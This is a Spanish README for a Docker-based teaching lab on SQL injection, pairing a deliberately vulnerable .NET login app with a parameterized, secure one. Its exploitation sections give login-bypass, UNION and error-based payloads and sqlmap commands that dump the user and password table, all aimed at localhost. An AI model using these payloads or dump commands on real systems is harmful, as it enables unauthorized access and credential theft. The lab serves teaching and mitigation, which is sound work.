# 🛡️ Laboratorio de SQL Injection: Explotación y Mitigación

Este laboratorio es una plataforma educativa diseñada para comprender, explotar y mitigar vulnerabilidades de **SQL Injection (SQLi)** en aplicaciones modernas desarrolladas con **.NET 8**.

---

## 🚀 Escenarios de Aprendizaje

El proyecto consta de dos aplicaciones web que operan sobre la misma base de datos, pero con implementaciones de seguridad opuestas:

1.  **🔴 Aplicación Vulnerable (Puerto 8080):** 
    - Implementa autenticación mediante **concatenación directa de strings**.
    - Es susceptible a bypass de login y extracción de datos.
    - Ideal para practicar con herramientas como `sqlmap`.

2.  **🟢 Aplicación Segura (Puerto 8081):**
    - Implementa **Consultas Parametrizadas** (Prepared Statements).
    - Inmune a ataques de inyección SQL.
    - Demuestra las mejores prácticas de defensa en profundidad.

---

## 🛠️ Requisitos Previos

Antes de comenzar, asegúrate de tener instalado:
- **Docker Desktop** (con soporte para Docker Compose).
- **Git** (para clonar el repositorio).
- (Opcional) **Azure Data Studio** o **SQL Server Management Studio (SSMS)** para inspeccionar la DB.

---

## 🏗️ Guía de Ejecución Paso a Paso

Sigue estos pasos para poner en marcha el laboratorio en menos de 5 minutos:

### 1. Clonar el repositorio
```bash
git clone https://github.com/mjsolano/Laboratorio-SQLi-Definitivo.git
cd Laboratorio-SQLi-Definitivo
```

### 2. Iniciar el entorno con Docker
Ejecuta el siguiente comando en la raíz del proyecto para descargar las imágenes y compilar los contenedores:

```powershell
docker-compose up -d --build
```

> [!NOTE]
> La primera vez puede tardar un poco mientras se descargan las imágenes de SQL Server y el SDK de .NET.

### 3. Verificar que los contenedores estén corriendo
```powershell
docker ps
```
Deberías ver tres contenedores: `sql_server_lab`, `vulnerable_app` y `secure_app`.

### 4. Inicializar la Base de Datos
Debido a las restricciones de seguridad de SQL Server, la base de datos `LabSQLi` y la tabla `Usuarios` deben crearse manualmente una vez que el contenedor esté listo. 

Ejecuta este comando para correr el script de inicialización automáticamente:

```powershell
docker exec -it sql_server_lab /opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P "Password_Fuerte_123!" -i /init.sql -C
```

*Si el comando anterior falla por permisos o rutas, puedes copiar el contenido de `init.sql` y ejecutarlo desde tu cliente SQL favorito conectándote a `localhost,1433`.*

---

## 🧪 Pruebas y Explotación

### Bypass de Login (App Vulnerable)
1. Ve a `http://localhost:8080`.
2. En el campo de **Usuario**, ingresa: `admin' --`
3. En el campo de **Password**, ingresa cualquier cosa.
4. Presiona "Login". ¡Habrás entrado sin conocer la contraseña!

### Intento en App Segura
1. Ve a `http://localhost:8081`.
2. Intenta el mismo payload: `admin' --`.
3. Verás que el sistema rechaza el intento, tratando el payload como texto literal.

---

## 🔥 Automatización con sqlmap

`sqlmap` es la herramienta estándar para detectar y explotar inyecciones SQL. Puedes usarla para ver lo fácil que es extraer toda la base de datos de la aplicación vulnerable.

### 1. Detectar Vulnerabilidad
```bash
sqlmap -u "http://localhost:8080/Login/VulnerableLogin" --data="usuario=admin&password=abc" --method POST --batch
```

### 2. Listar Bases de Datos
```bash
sqlmap -u "http://localhost:8080/Login/VulnerableLogin" --data="usuario=admin&password=abc" --method POST --dbs --batch
```

### 3. Extraer Tablas de la DB 'LabSQLi'
```bash
sqlmap -u "http://localhost:8080/Login/VulnerableLogin" --data="usuario=admin&password=abc" --method POST -D LabSQLi --tables --batch
```

### 4. Dumpear (Robar) los Usuarios y Contraseñas
```bash
sqlmap -u "http://localhost:8080/Login/VulnerableLogin" --data="usuario=admin&password=abc" --method POST -D LabSQLi -T Usuarios --dump --batch
```

> [!TIP]
> Observa cómo `sqlmap` identifica que el parámetro `usuario` es vulnerable a múltiples técnicas (Boolean-based blind, Error-based, Union-based).

---

## 🛠️ Otros Escenarios de Explotación Manual

### Inyección de Unión (UNION-Based)
Para extraer información de otras tablas o del sistema:
- **Payload en Usuario:** `admin' UNION SELECT @@VERSION --`
- **Explicación:** Esto mostrará la versión de SQL Server directamente en el saludo de bienvenida.

### Inyección Basada en Errores (Error-Based)
Si intentas romper la consulta a propósito:
- **Payload en Usuario:** `admin' AND 1=(SELECT COUNT(*) FROM sys.databases) --`
- **Explicación:** Al ser tipos de datos incompatibles (int vs string), la aplicación reflejará el error del motor SQL, revelando detalles técnicos.

---

## 📂 Estructura del Proyecto

- `/laboratorio-sql`: Código fuente de la aplicación vulnerable.
- `/laboratorio-sql-seguro`: Código fuente de la aplicación protegida.
- `docker-compose.yml`: Orquestación de todo el entorno.
- `init.sql`: Script de creación de datos iniciales.

---

## 🛡️ Mejores Prácticas y Mitigación

Para evitar estos ataques en entornos de producción, este laboratorio demuestra que la mejor defensa es:

1.  **Consultas Parametrizadas**: Nunca concatenar entradas del usuario.
2.  **Principio de Menor Privilegio**: El usuario de la DB (`sa` en este lab por simplicidad) no debería ser el usado por la app.
3.  **Manejo de Errores Genérico**: No mostrar mensajes detallados del motor SQL al usuario final.

### ⚡ Rendimiento (Sugerido para Producción)
Siguiendo estándares de la industria, una aplicación real escalable debería implementar:
- **Operaciones Asíncronas**: Uso de `async/await` en los controladores para no bloquear hilos.
- **Connection Pooling**: Gestionado automáticamente por ADO.NET, pero configurable.
- **Caching (Redis)**: Para evitar consultas repetitivas a la base de datos.
- **Tareas de Fondo**: Para operaciones largas que no deben bloquear la UI.

---

## ⚖️ Licencia y Propósito
Este repositorio tiene fines exclusivamente **educativos**. No utilices estas técnicas en sistemas sin autorización previa. 

---
Desarrollado con ❤️ para la comunidad de Ciberseguridad.
